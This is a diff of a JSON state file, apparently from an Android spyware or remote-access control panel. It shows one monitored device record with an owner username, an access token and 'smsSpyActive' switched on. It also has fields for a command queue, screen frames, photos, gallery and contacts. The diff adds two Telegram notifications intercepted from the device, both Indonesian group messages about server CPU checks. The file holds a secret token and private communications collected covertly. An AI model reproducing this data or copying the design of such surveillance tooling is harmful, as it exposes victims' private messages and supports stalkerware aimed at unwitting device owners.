@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777061406154,
+    "lastSeen": 1777061412232,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -19,7 +19,24 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
+        "content": "\n✅ [AUTO-CHECK CPU] - V1 ✅\n\nTotal Server yang Dicek: 17\n\nSemua server yang dicek berada dalam batas CPU wajar.",
+        "time": "25/04 03:10",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061414851
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
+        "content": "⏳ [AUTO-CHECK CPU] - V1\n\nMemulai pengecekan. Mohon tunggu...",
+        "time": "25/04 03:10",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061409664
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
